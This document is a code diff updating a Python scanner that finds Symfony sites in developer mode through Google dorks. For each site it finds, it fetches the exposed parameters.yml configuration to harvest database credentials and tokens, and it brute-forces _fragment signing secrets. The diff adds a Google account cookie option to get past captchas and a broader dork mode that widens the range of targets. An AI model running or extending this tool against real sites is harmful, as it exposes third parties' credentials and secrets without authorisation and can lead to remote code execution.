@@ -2,7 +2,7 @@ try:
 	import requests
 	import re
 	from bs4 import BeautifulSoup
-	import argparse
+	import argparse, textwrap
 	import hashlib
 	import hmac
 	import base64
@@ -22,10 +22,15 @@ except ImportError as e:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 colorama.init()
 
-parser=argparse.ArgumentParser(description="This tool allows you to scan the configuration of Symfony developer mode using Google Dorks")
+parser=argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description="""\
+	This tool allows you to scan the configuration of Symfony developer mode using Google Dorks.\n
+	By default the first 10 urls are scanned.
+""")
 parser.add_argument("--nburl", '-n', dest='nburl', help="Specifies the total number of urls to scan", type=str)
 parser.add_argument("--starturl", '-s', dest='starturl', help="Specifies which url to start from on Google", type=str)
-parser.add_argument("--jmp", '-j', dest='jmp', help="Do not use the token bruteforce method : --jmp true", type=bool, default=False)
+parser.add_argument("--cookie", '-c', dest='cookie', help="Cookie from your google account to bypass the captcha", type=str)
+parser.add_argument("--all", '-a', dest='all', help="Google Dorks paylods to increase targets but many more false positives", default=False, action='store_true')
+parser.add_argument("--jmp", '-j', dest='jmp', help="Do not use the token bruteforce method", default=False, action='store_true')
 args=parser.parse_args()
 
 
@@ -37,8 +42,10 @@ headers_Get = {
 		'sec-fetch-mode' : 'navigate',
 		'sec-fetch-site' : 'none',
 		'sec-fetch-user' : '?1',
+		'DNT': '1',
 	    'upgrade-insecure-requests' : '1',
-        'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
+        'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4280.141 Safari/537.36',
+        'cookie':'{}'.format(args.cookie)
     }
 
 USUAL_SECRETS = [
@@ -158,11 +165,12 @@ def fix_url(url):
 	This function give a valid url without parameters
 	"""
 	if(re.search(".*/$",url)):
-		pass
+		url = url.split("app_dev.php")[0]
 	else:
 		newList = url.split('/')
 		delVal = str(newList[len(newList)-1])
 		url = url.replace(delVal,'')
+		url = url.split("app_dev.php")[0]
 	return url
 
 def fix_index_url(url,content):
@@ -180,7 +188,7 @@ def fix_index_url(url,content):
 
 def robot_detector(content):
 	res = True
-	if(re.search(".*robot.*",content)):
+	if(re.search(".*captcha.*",content)):
 		res = False
 	return res
 
@@ -235,7 +243,7 @@ def check_args(args):
 
 os.system('cls' if os.name == 'nt' else 'clear')
 HEADER=pyfiglet.figlet_format("Symfony vuln checker", font = "slant"  ) 
-VERSION='version:1.1'
+VERSION='version:1.2'
 WRITER='https://github.com/bizibabe/symfony-check-vuln-google-dorks\n'
 BY='By Google Dorks\n'
 print(Fore.YELLOW+HEADER)
@@ -249,10 +257,15 @@ nbUrl = '10'
 nbMut = 0
 startUrl = '0'
 countVuln = 0
-dork_payload = 'intitle:"index of" "app_dev.php"'
+countRegex = 0
 end = 0
 listUrl = list()
+url_vuln = ["app_dev.php/_profiler/open?file=app/config/parameters.yml", "app_dev.php/_configurator/final"]
 
+if(args.all):
+	dork_payload = 'inurl:"app_dev.php" | intitle:"index of" "app_dev.php"'
+else:
+	dork_payload = 'intitle:"index of" "app_dev.php"'
 if(args.nburl):
 	if(not check_args(args.nburl)):
 		print(Fore.YELLOW+'[!] Parameter nburl must be int')
@@ -268,75 +281,81 @@ if(args.starturl):
 
 try:
 	print('--------------------------------------------------------------------------------------------------------')
-	url = 'https://www.google.com/search?start={}&num={}&q={}'.format(startUrl,nbUrl,dork_payload)
-	r = requests.get(url, headers=headers_Get)
+	url = 'https://www.google.com/search?start={}&num={}&q={}&filter=0'.format(startUrl,nbUrl,dork_payload)
+	s = requests.session()
+	r = s.get(url, headers=headers_Get)
 	if(robot_detector(r.text)):
 		soup = BeautifulSoup(r.content, 'lxml')
 		tags = soup.find_all('a')
 		for tag in tags:
 			url = tag.get('href')
 			if(url == "#" or url == None or re.search(".*google..*", url) or re.search("^/search?.*", url) or not re.search("^http.*", url)):
-				end = end + 1
-				if(end == len(tags)):
-					print(Fore.RED+'[!] Limit reached')
-					sys.exit(1)
+				end += 1
+				pass
+			elif(re.search(".*github.com.*", url) or re.search(".*git..*", url) or re.search(".*coderoad.ru.*", url)):
+				end += 1
+				countRegex += 1
 			else:
+				print(url)
 				url = fix_url(url)
+				print(url)
 				if url not in listUrl:
 					listUrl.append(url)
 					try:
-						check0 = requests.get(url, verify=False, timeout=5)
+						check0 = s.get(url, verify=False, timeout=5)
 						url = fix_index_url(url,check0.text)
-						check1 = requests.get(url+'app_dev.php', verify=False, timeout=5)
-						if(check1.status_code != 403):
-							check2 = requests.get(url+'app_dev.php/_profiler/open?file=app/config/parameters.yml', verify=False, timeout=5)
-							check3 = requests.get(url+'app_dev.php/_configurator/final', verify=False, timeout=5)
-							check4 = requests.get(url+'app_dev.php/_fragment', verify=False, timeout=5)
-							if(check2.url == url+'app_dev.php/_profiler/open?file=app/config/parameters.yml' and check2.status_code == 200 and not re.search(".*Token not found.*", str(check2.content))):
-								if(check4.status_code == 403):
-									print(Fore.GREEN+'[+] {}app_dev.php/_profiler/open?file=app/config/parameters.yml is vulnerable [Token and creds found] [_fragment found]'.format(url))
-									countVuln = countVuln + 1
-									totalUrl = totalUrl + 1
-								else:
-									print(Fore.YELLOW+'[!] {}app_dev.php/_profiler/open?file=app/config/parameters.yml maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
-									totalUrl = totalUrl + 1
-							elif(check3.url == url+'app_dev.php/_configurator/final' and check3.status_code == 200 and not re.search(".*Token not found.*", str(check3.content))):
-								if(check4.status_code == 403):
-									print(Fore.GREEN+'[+] {}app_dev.php/_configurator/final is vulnerable [Token and creds found] [_fragment found]'.format(url))
-									countVuln = countVuln + 1
-									totalUrl = totalUrl + 1
-								else:
-									print(Fore.YELLOW+'[!] {}app_dev.php/_configurator/final maybe vulnerable'.format(url)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
-									totalUrl = totalUrl + 1
-							elif(check4.status_code == 403):
-								if(args.jmp != True):
-									urlFragment = url+'app_dev.php/_fragment'
-									mutations = generate_mutations(urlFragment, urlFragment, "", "")
-									totalMutation = len(mutations)
-									for algo, secret, internal_url in mutations:
-										nbMut = nbMut + 1
-										print(Fore.BLUE+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
-										urlToken = build_url_with_hash(urlFragment, internal_url, secret, algo)
-										response = requests.get(urlToken)
-										code = response.status_code
-										if code != 403:
-											print(Fore.GREEN+'[+] {} is vulnerable [Token found : {}]'.format(internal_url,secret)+Fore.GREEN+' [_fragment found]')
-											countVuln = countVuln + 1
-											totalUrl = totalUrl + 1
-											break
-										else:
-											pass
-									else:
-										print(Fore.YELLOW+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+Fore.GREEN+' [_fragment found]')
-										nbMut = 0
+						check_debug = s.get(url+'app_dev.php', verify=False, timeout=5)
+						if(check_debug.status_code != 403):
+							check_fragment = s.get(url+'app_dev.php/_fragment', verify=False, timeout=5)
+							for vuln in url_vuln:
+								check_vuln = s.get(url+vuln, verify=False, timeout=5)
+								if(check_vuln.url == url+vuln and check_vuln.status_code == 200 and not re.search(".*Token not found.*", str(check_vuln.content)) and re.search(".*database_host.*",check_vuln.text)):
+									if(check_fragment.status_code == 403):
+										print(Fore.GREEN+'[+] {}{} is vulnerable [Token and creds found] [_fragment found]'.format(url,vuln))
+										countVuln = countVuln + 1
 										totalUrl = totalUrl + 1
-
-								else:
-									print(Fore.YELLOW+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
-									totalUrl = totalUrl + 1
+										break
+									else:
+										print(Fore.YELLOW+'[!] {}{} maybe vulnerable'.format(url,vuln)+Fore.GREEN+' [Token and creds found]'+Fore.RED+' [_fragment not found]')
+										totalUrl = totalUrl + 1
+								elif(re.search(".*resource:.*",check_vuln.text)):
+									if(check_fragment.status_code == 403):
+										print(Fore.YELLOW+'[+] {}{} maybe vulnerable'.format(url,vuln)+Fore.GREEN+' [Ressource found in url] [_fragment found]')
+										totalUrl = totalUrl + 1
+										break
+									else:
+										print(Fore.YELLOW+'[!] {}{} maybe vulnerable'.format(url,vuln)+Fore.GREEN+' [Ressource found in url]'+Fore.RED+' [_fragment not found]')
+										totalUrl = totalUrl + 1
 							else:
-								print(Fore.RED+'[-] {} is not vulnerable [Something is broken or no method found]'.format(url))
-								totalUrl = totalUrl + 1
+								if(check_fragment.status_code == 403):
+									if(args.jmp != True):
+										urlFragment = url+'app_dev.php/_fragment'
+										mutations = generate_mutations(urlFragment, urlFragment, "", "")
+										totalMutation = len(mutations)
+										for algo, secret, internal_url in mutations:
+											nbMut = nbMut + 1
+											print(Fore.BLUE+'[?] {} Trying Token {}/{} ...\r'.format(internal_url,nbMut,totalMutation),end="")
+											urlToken = build_url_with_hash(urlFragment, internal_url, secret, algo)
+											response = s.get(urlToken)
+											code = response.status_code
+											if code != 403:
+												print(Fore.GREEN+'[+] {} is vulnerable [Token found : {}]'.format(internal_url,secret)+Fore.GREEN+' [_fragment found]')
+												countVuln = countVuln + 1
+												totalUrl = totalUrl + 1
+												break
+											else:
+												pass
+										else:
+											print(Fore.YELLOW+'[!] {} maybe vulnerable [Token or internal url not found]'.format(internal_url)+Fore.GREEN+' [_fragment found]')
+											nbMut = 0
+											totalUrl = totalUrl + 1
+
+									else:
+										print(Fore.YELLOW+'[!] {} maybe vulnerable [bruteforce skiped]'.format(url))
+										totalUrl = totalUrl + 1
+								else:
+									print(Fore.RED+'[-] {} is not vulnerable [Something is broken or no method found]'.format(url))
+									totalUrl = totalUrl + 1
 						else:
 							print(Fore.RED+'[-] {} is not vulnerable [app_dev.php is not authorised]'.format(url))
 							totalUrl = totalUrl + 1
@@ -355,13 +374,16 @@ try:
 						continue
 	else:
 		print(Fore.YELLOW+'[!] You have been detected as a robot')
-		print(Fore.MAGENTA+'Reload your web browser and check if you have been detected as a bot > pass the verrication')
-		print(Fore.MAGENTA+'OR')
-		print(Fore.MAGENTA+'Delete your browsing data > reconnect to your google account')
+		print(Fore.MAGENTA+'Reload your web browser and check if you have been detected as a bot, put your Google account cookie with -c option.')
 		sys.exit(1)
 
 
 except KeyboardInterrupt:
 	sys.exit(0)
-	
-print(Fore.BLUE+"\n[!] {}/{} websites are vulnerable".format(countVuln,totalUrl))
+
+if(end == len(tags)):
+	print(Fore.RED+'[!] Limit reached')
+else:
+	print(Fore.BLUE+"\n[!] {}/{} websites are vulnerable".format(countVuln,totalUrl))
+	if countRegex>1:
+		print(Fore.BLUE+"[!] {} websites ignored by Regex".format(countRegex))
